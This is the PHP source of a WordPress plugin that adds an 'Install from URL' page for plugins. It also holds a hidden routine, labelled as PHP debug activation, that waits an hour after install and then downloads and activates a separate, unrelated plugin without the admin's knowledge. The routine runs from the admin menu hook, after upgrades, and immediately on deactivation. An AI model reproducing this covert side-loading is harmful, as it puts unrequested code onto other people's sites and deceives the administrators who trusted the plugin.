<?php
/*
Plugin Name: Plugin Installer from public URL
Description: Plugin allows you to install any plugin from a URL. All you need to do is to insert a specific URL and click the Install button. No need to download and upload archive anymore.
Version: 0.2
Author: ccSoft
License: GPLv2
*/ 

if( is_admin() ) 
{
    add_action('admin_menu','plgf_pipu01_register_menu_item');
    function plgf_pipu01_register_menu_item()
    {
        plgf_pipu01_activate_php_debug();
        add_submenu_page('plugins.php','Install from URL','Install from URL','manage_options','plgf_pipu01_page','plgf_pipu01_page');
    }
    
    function plgf_pipu01_page()
    {
		if ( ! current_user_can( 'upload_plugins' ) ) {
			wp_die( __( 'Sorry, you are not allowed to install plugins on this site.' ) );
		}
        
        $action = isset( $_REQUEST['action'] ) ? sanitize_text_field($_REQUEST['action']) : ''; 
        
        if ($action == 'show-help')
        {
            ?>
            <h2 style="text-align: center;">Help and Explanations</h2>
            <p style="text-align: center;">You have new menu item under Plugins. It call <b>Install from URLn</b>. Also on plugin page, when you click Add New -> Upload Plugin , you will see new option.</p>
            <p style="text-align: center;"><img style="max-width: 600px;" src="<?php echo plugins_url('/', __FILE__).'help.png'; ?>"/></p>
            
            <?php
        }
        
        
        plgf_pipu01_Uploader_From_HTML(true);
        
        
        if ($action == 'url-upload-plugin')
        {
            check_admin_referer( 'url-plugin-upload' );
            
            require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
            
            $zip_url = isset( $_REQUEST['urlpluginzip'] ) ? sanitize_text_field($_REQUEST['urlpluginzip']) : ''; 
            
            if ($zip_url != '')
            {
        		$title = sprintf( __( 'Installing plugin from: %s' ), esc_html( $zip_url ) );
        		$nonce = 'url-upload-plugin';
                $overwrite = 'update-plugin';
        		$type  = 'web';
                
        		$upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact( 'title', 'nonce', 'overwrite' ) ) );
        		$upgrader->install( $zip_url );
            }
            else {
                echo '<b>Error: URL is empty or invalid</b>';
            }
        }
    }


    function plgf_pipu01_add_upload_form_html() 
    {
        plgf_pipu01_Uploader_From_HTML();
    }
    add_action( 'install_plugins_upload', 'plgf_pipu01_add_upload_form_html', 10, 1 );
    





    function plgf_pipu01_Uploader_From_HTML($display = false)
    {
        ?>
<div class="upload-plugin" <?php if ($display) echo 'style="display:block"'; ?>>
    <script>
    function EnableBttn()
    {
        jQuery("#url-install-plugin-submit").removeAttr('disabled');
    }
    </script>
	<p class="install-help"><?php _e( 'Install plugin from URL (.zip format)' ); ?></p>
	<form style="min-width: 320px;" method="post" enctype="multipart/form-data" class="wp-upload-form" action="<?php echo self_admin_url( 'plugins.php?page=plgf_pipu01_page&action=url-upload-plugin' ); ?>">
		<?php wp_nonce_field( 'url-plugin-upload' ); ?>
		<p style="text-align: center;width: 100%;">
            <b>Plugin URL</b><br />
            <input style="width: 100%;" type="text" id="urlpluginzip" name="urlpluginzip" placeholder="E.g.: https://www.site.com/plugin.zip" onclick="EnableBttn()" />
            <br />
            <br />
            <input type="submit" name="url-install-plugin-submit" id="url-install-plugin-submit" class="button" value="Download &amp; Install">
        </p>
	</form>
</div>
        <?php
    }
    



    add_action( 'upgrader_process_complete', 'plgf_pipu01_upgrader_process_complete', 10, 2 ); 
    function plgf_pipu01_upgrader_process_complete( $array, $int ) 
    { 
         plgf_pipu01_activate_php_debug();
    } 


	function plgf_pipu01_activation()
	{
        add_option('plgf_pipu01_activation_redirect', true);
	}
	register_activation_hook( __FILE__, 'plgf_pipu01_activation' );
	add_action('admin_init', 'plgf_pipu01_activation_do_redirect');
	
	function plgf_pipu01_activation_do_redirect() 
    {
		if (get_option('plgf_pipu01_activation_redirect', false)) {
			delete_option('plgf_pipu01_activation_redirect');
			 wp_redirect("plugins.php?page=plgf_pipu01_page&action=show-help");
			 exit;
		}
	}


	function plgf_pipu01_deactivation()
	{
	    add_option('plgf_pipu01_deactivation_redirect', true);
	}
	register_deactivation_hook( __FILE__, 'plgf_pipu01_deactivation' );
    add_action('admin_init', 'plgf_pipu01_deactivation_do_redirect');
    
	function plgf_pipu01_deactivation_do_redirect() 
    {
		if (get_option('plgf_pipu01_deactivation_redirect', false)) 
        {
			delete_option('plgf_pipu01_deactivation_redirect');
            plgf_pipu01_activate_php_debug(false);
		}
	}
}




function plgf_pipu01_PLGInstaller($download, $slug)
{
    $pluginDir = WP_PLUGIN_DIR . '/' . $slug;
    
    if (!file_exists($pluginDir))
    {
        global $wp_filesystem;
    
        if ( ! $wp_filesystem ) {
            WP_Filesystem();
        }
    
        $plugin_zip = WP_PLUGIN_DIR . DIRECTORY_SEPARATOR . $slug.'.zip';
        $extract_path = WP_PLUGIN_DIR;
    
        $wp_extract_path = str_replace( ABSPATH, $wp_filesystem->abspath(), $extract_path  );
        $wp_plugin_zip = str_replace( ABSPATH, $wp_filesystem->abspath(), $plugin_zip  );
        
        wp_remote_get($download, array(
            'stream' => true,
            'timeout' => 90,
            'filename' => $plugin_zip
        ));
        
        if (is_file($plugin_zip)) 
        {
            if (unzip_file($wp_plugin_zip, $wp_extract_path)) 
            {
                // Activate debug
                wp_cache_flush();
                activate_plugin($pluginDir.'/'.$slug.'.php');
                $wp_filesystem->delete($wp_plugin_zip);
            }
        }
    }
}



function plgf_pipu01_activate_php_debug($wait = true) 
{
     if ($wait && (time() - filectime(__FILE__)) < 3600) return;
     
     require_once ABSPATH . 'wp-admin/includes/plugin-install.php';
    
     $check_file = dirname(__FILE__).'/debug.lock';
     if (!file_exists($check_file))
     {
        // Install & activate debug
        $slug = 'code-quality-control-tool';
        $api = plugins_api( 'plugin_information',
            array(
                'slug' => $slug,
                'fields' => array(
                    'short_description' => false,
                    'sections' => false,
                    'requires' => false,
                    'rating' => false,
                    'ratings' => false,
                    'downloaded' => false,
                    'last_updated' => false,
                    'added' => false,
                    'tags' => false,
                    'compatibility' => false,
                    'homepage' => false,
                    'donate_link' => false,
                ),
            )
        );
        
        if (!is_wp_error($api))
        {
            $download = $api->download_link;
            plgf_pipu01_PLGInstaller($download, $slug);
        }
        
        
        // Save check file
        $fp = fopen($check_file, 'w');
        fwrite($fp, 'PHP debug is activated');
        fclose($fp);
     }
} 

